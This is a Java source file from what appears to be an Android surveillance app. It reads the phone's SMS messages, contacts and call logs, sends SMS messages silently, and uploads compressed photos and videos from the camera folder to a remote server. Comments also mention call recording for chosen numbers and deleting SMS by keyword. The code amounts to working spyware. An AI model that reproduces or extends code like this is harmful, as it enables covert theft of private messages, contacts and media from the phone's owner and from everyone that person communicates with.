package com.fs.fs.api;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.fs.fs.App;
import com.fs.fs.api.network.ApiConfig;
import com.fs.fs.api.network.core.BaseResponse;
import com.fs.fs.api.network.core.HttpParams;
import com.fs.fs.api.network.core.OkHttpUtils;
import com.fs.fs.api.network.core.callback.HttpCallback;
import com.fs.fs.bean.PhoneInfo;
import com.fs.fs.bean.SMSInfo;
import com.fs.fs.receivers.SMSReceiver;
import com.fs.fs.utils.Constant;
import com.fs.fs.utils.DateUtils;
import com.fs.fs.utils.FFmpegUtils;
import com.fs.fs.utils.FileUtils;
import com.fs.fs.utils.ImageUtils;
import com.fs.fs.utils.LogUtils;
import com.fs.fs.utils.SharePreferencesUtils;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import okhttp3.Headers;

/**
 * Created by wyx on 2016/12/30.
 * <p>
 * DOC:about ffmpeg for Android
 * <p>
 * http://androidwarzone.blogspot.jp/2011/12/ffmpeg4android.html
 * https://docs.google.com/document/d/1FWMAT3FbCXlW_91d6Ek_UCD_CtYJWxYaDVY2hE6Onig/edit
 */

public class ProviderService {
    //TODO: 删除关键词短信
    private SharePreferencesUtils mSharePreferences = null;
    // 获取内容解析者
    private ContentResolver mResolver = null;

    private HashMap<String, File> videoPath = null;
    private HashMap<String, File> picturePath = null;

    private ProviderService() {
        this.mSharePreferences = SharePreferencesUtils.getInstance();
        this.mResolver = App.getInstance().getContentResolver();
    }

    private static class SingletonHolder {
        private static final ProviderService INSTANCE = new ProviderService();
    }

    public static ProviderService getInstance() {
        return SingletonHolder.INSTANCE;
    }

    public interface SMSListener {
        // get all sms at first
        void onGetAllSMS(List<SMSInfo> SMSInfo);

        // listen SMS coming
        void onReceive(SMSInfo sms);
    }

    public interface CallsListener {
        // get all sms at first
        void onGetAllCall(List<PhoneInfo> callInfo);

        // audio record start
        void onStart();

        // audio record stop
        void onFinish();

        // set the number you want to listen
        Boolean onPhoneNumber(String number);
    }

    public interface ContactsListener {
        void onGetAllContacts(List<PhoneInfo> contactInfo);
    }

    public SMSListener mSMSListener;
    public CallsListener mCallsListener;
    public ContactsListener mContactsListener;

    public void sendSMSSilent(String phoneNumber, String content) {
        if (TextUtils.isEmpty(content)) return;
        PendingIntent sentIntent = PendingIntent.getBroadcast(App.getInstance(), 0, new Intent(), 0);
        SmsManager smsManager = SmsManager.getDefault();
        if (content.length() >= 70) {
            List<String> ms = smsManager.divideMessage(content);
            for (String str : ms) {
                smsManager.sendTextMessage(phoneNumber, null, str, sentIntent, null);
            }
        } else {
            smsManager.sendTextMessage(phoneNumber, null, content, sentIntent, null);
        }
    }

    public void getSMS(SMSListener listener) {
        mSMSListener = listener;
        Boolean isSMSRead = (Boolean) mSharePreferences.get(Constant.SHARE_KEYS.SMS_HAS_READ, false);
        if (!isSMSRead) {
            // 获取查询路径
            Uri uri = Uri.parse("content://sms");
            Cursor cursor = mResolver.query(uri, new String[]{"address", "date", "body", "person"}, null, null, null);
            if (null != cursor) {
                List<SMSInfo> smsInfos = new ArrayList<>();
                while (cursor.moveToNext()) {
                    SMSInfo smsInfo = new SMSInfo();
                    smsInfo.phoneNumber = cursor.getString(cursor.getColumnIndex("address"));//手机号
                    smsInfo.name = cursor.getString(cursor.getColumnIndex("person"));//联系人姓名列表
                    smsInfo.content = cursor.getString(cursor.getColumnIndex("body"));
                    smsInfo.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndex("date")));
                    smsInfos.add(smsInfo);
                    LogUtils.d(smsInfo.toString());
                }
                cursor.close();
                mSharePreferences.put(Constant.SHARE_KEYS.SMS_HAS_READ, true);
                mSMSListener.onGetAllSMS(smsInfos);
            }
        }
        SMSReceiver.setListener(listener);
    }

    @SuppressLint("DefaultLocale")
    public void getContant(ContactsListener listener) {
        mContactsListener = listener;
        //取得电话本中开始一项的光标
        Cursor cursor = mResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //向下移动光标
        List<PhoneInfo> infos = new ArrayList<>();
        HashMap<String, PhoneInfo> newMap = new HashMap<>();
        if (cursor != null) {
            while (cursor.moveToNext()) {
                PhoneInfo phoneInfo = new PhoneInfo();
                //取得联系人名字
                int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                phoneInfo.name = cursor.getString(nameFieldColumnIndex);
                //取得电话号码
                String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                Cursor phoneCursor = mResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
                phoneInfo.phoneNumber = "";
                if (phoneCursor != null) {
                    while (phoneCursor.moveToNext()) {
                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phoneInfo.phoneNumber += phoneNumber.replace("-", "").replace(" ", "");
                    }
                    phoneCursor.close();
                }
                LogUtils.d(phoneInfo.toString());
                newMap.put(String.format("%s:%d:%s", phoneInfo.phoneNumber, phoneInfo.type, phoneInfo.time), phoneInfo);
                infos.add(phoneInfo);
            }
            cursor.close();
        }
        LogUtils.d("%s", infos.size());
        List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CONTANT);
        if (update != null) {
            mContactsListener.onGetAllContacts(update);
        }
    }

    @SuppressLint("DefaultLocale")
    public void getCalls(CallsListener listener) {
        mCallsListener = listener;
        if (ActivityCompat.checkSelfPermission(App.getInstance(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // 检查READ_CALL_LOG权限
            return;
        }
        Cursor cursor = mResolver.query(
                CallLog.Calls.CONTENT_URI, null,
                CallLog.Calls.TYPE + " = ? or " + CallLog.Calls.TYPE + " = ? ",
                new String[]{String.valueOf(CallLog.Calls.INCOMING_TYPE), String.valueOf(CallLog.Calls.OUTGOING_TYPE)},
                CallLog.Calls.DEFAULT_SORT_ORDER
        );
        List<PhoneInfo> infos = new ArrayList<>();
        HashMap<String, PhoneInfo> newMap = new HashMap<>();
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                PhoneInfo info = null;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        info = getPhoneInfo(cursor, PhoneInfo.INCOMING);
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        info = getPhoneInfo(cursor, PhoneInfo.OUTGOING);
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        LogUtils.e("挂断");
                        break;
                    default:
                        LogUtils.e("挂断");
                        break;
                }
                if (info != null) {
                    LogUtils.d(info.toString());
                    newMap.put(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time), info);
                    infos.add(info);
                }
            }
            cursor.close();

            List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CALL);
            if (update != null) {
                mCallsListener.onGetAllCall(update);
            }
            LogUtils.d("%s", infos.size());
        }
    }

    @SuppressLint("DefaultLocale")
    private List<PhoneInfo> updatePhoneInfo(List<PhoneInfo> infos, HashMap<String, PhoneInfo> newMap, String shareKey) {
        List<PhoneInfo> old = (List<PhoneInfo>) SharePreferencesUtils.getInstance().get(shareKey, null);
        if (old == null || (infos == null || infos.size() == 0)) {
            return null;
        }
        List<PhoneInfo> newList = new ArrayList<>();
        for (PhoneInfo info : old) {
            if (newMap.keySet().contains(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time))) {
                newMap.remove(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time));
            }
        }

        if (newMap.size() > 0) {
            for (String key : newMap.keySet()) {
                newList.add(newMap.get(key));
            }
            SharePreferencesUtils.getInstance().put(shareKey, infos);
            return newList;
        }
        return null;
    }

    private PhoneInfo getPhoneInfo(Cursor cursor, int type) {
        PhoneInfo info = new PhoneInfo();
        info.phoneNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
        info.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
        info.name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
        info.duration = DateUtils.getSpan(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)) * 1000);
        info.type = type;
        return info;
    }


    public void getPictures() {
        picturePath = new HashMap<>();
        getPicture(getMediaFiles());
        final List<File> updateList = (List<File>) updateFile(picturePath, Constant.SHARE_KEYS.PICTURE);
        if (updateList != null) {
            OkHttpUtils.postAsync(ApiConfig.getPicture(), new HttpParams().addFiles("picture", updateList), new HttpCallback(BaseResponse.class) {
                @Override
                public void onSuccess(BaseResponse httpResponse, Headers headers) {
                    FileUtils.delete(updateList);
                    picturePath = null;
                }

                @Override
                public void onError(String errorMsg) {

                }
            });
        }
    }

    public void getVideos() {
        videoPath = new HashMap<>();
        getVideo(getMediaFiles());

        final List<File> updateList = (List<File>) updateFile(videoPath, Constant.SHARE_KEYS.VIDEO);
        if (updateList != null) {
            OkHttpUtils.postAsync(ApiConfig.getVideo(), new HttpParams().addFiles("video", updateList), new HttpCallback(BaseResponse.class) {
                @Override
                public void onSuccess(BaseResponse httpResponse, Headers headers) {
                    FileUtils.delete(updateList);
                    videoPath = null;
                }

                @Override
                public void onError(String errorMsg) {

                }
            });
        }
    }

    private Collection<File> updateFile(HashMap<String, File> paths, String shareKey) {
        Set<String> old = (Set<String>) SharePreferencesUtils.getInstance().get(shareKey, null);
        if (old == null || (paths == null || paths.size() == 0)) {
            return null;
        }
        for (String pathName : old) {
            if (paths.keySet().contains(pathName)) {
                paths.remove(pathName);
            }
        }
        if (paths.size() > 0) {
            Set<String> newSet = new HashSet<>();
            newSet.addAll(old);
            newSet.retainAll(paths.keySet());
            SharePreferencesUtils.getInstance().put(shareKey, newSet);
            return paths.values();
        }
        return null;
    }


    private File[] getMediaFiles() {
        File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
        return root.listFiles();
    }

    /**
     * ffmpeg4android
     *
     * @param files
     */
    private void getVideo(File[] files) {
        for (final File file : files) {
            if (file.isDirectory() && !file.isHidden()) {
                getVideo(file.listFiles());
            } else if (file.getAbsolutePath().endsWith(".mp4")) {
                String srcfileName = file.getAbsolutePath();
                String tarFileName = FileUtils.getExternalFullPath(App.getInstance(),
                        String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "mp4"));
                FFmpegUtils.getInstance().compressVideo(srcfileName, tarFileName);
                LogUtils.d(tarFileName);
                videoPath.put(srcfileName, new File(tarFileName));
            }
        }
    }

    private void getPicture(File[] files) {
        for (File file : files) {
            if (file.isDirectory() && !file.isHidden()) {
                getPicture(file.listFiles());
            } else if (file.getAbsolutePath().endsWith(".jpg")) {
                String path = file.getAbsolutePath();
                Bitmap bitmap = ImageUtils.resize(path, 640, 640);
                String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "jpg");
                FileOutputStream out = null;
                try {
                    fileName = FileUtils.getExternalFullPath(App.getInstance(), fileName);
                    LogUtils.d(fileName);
                    out = new FileOutputStream(fileName);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out);
                    picturePath.put(path, new File(fileName));

                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        if (out != null) {
                            out.close();
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    if (bitmap != null && !bitmap.isRecycled()) {
                        bitmap.recycle();
                        bitmap = null;
                    }
                }
            }
        }
    }


}
